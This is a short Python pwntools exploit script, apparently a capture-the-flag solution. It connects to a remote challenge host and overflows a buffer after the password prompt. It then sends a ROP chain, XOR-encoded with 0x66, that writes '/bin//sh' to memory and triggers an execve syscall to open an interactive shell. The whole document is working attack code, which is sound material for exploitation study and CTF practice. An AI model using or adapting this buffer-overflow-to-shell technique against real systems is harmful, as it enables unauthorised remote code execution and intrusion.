from pwn import *
from struct import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

# io=process("./p8")
io=remote("node1.anna.nssctf.cn",28093)

io.recvuntil(b"Password: \n")
def rop():
    p = b''
    p += pack('<Q', 0x00000000004040fe) # pop rsi ; ret
    p += pack('<Q', 0x00000000006ba0e0) # @ .data
    p += pack('<Q', 0x0000000000449b9c) # pop rax ; ret
    p += b'/bin//sh'
    p += pack('<Q', 0x000000000047f7b1) # mov qword ptr [rsi], rax ; ret
    p += pack('<Q', 0x00000000004040fe) # pop rsi ; ret
    p += pack('<Q', 0x00000000006ba0e8) # @ .data + 8
    p += pack('<Q', 0x0000000000444f00) # xor rax, rax ; ret
    p += pack('<Q', 0x000000000047f7b1) # mov qword ptr [rsi], rax ; ret
    p += pack('<Q', 0x00000000004006e6) # pop rdi ; ret
    p += pack('<Q', 0x00000000006ba0e0) # @ .data
    p += pack('<Q', 0x00000000004040fe) # pop rsi ; ret
    p += pack('<Q', 0x00000000006ba0e8) # @ .data + 8
    p += pack('<Q', 0x000000000044c156) # pop rdx ; ret
    p += pack('<Q', 0x00000000006ba0e8) # @ .data + 8
    p += pack('<Q', 0x0000000000444f00) # xor rax, rax ; ret
    p += pack('<Q', 0x0000000000449b9c) # pop rax ; ret
    p += p64(0x3b)
    p += pack('<Q', 0x000000000040139c) # syscall
    return p

tmp=rop()

payload='a'*0x50

tt=''

for i in tmp:
    tt+=chr(i^0x66)
payload+=tt
io.sendline(payload)

io.interactive()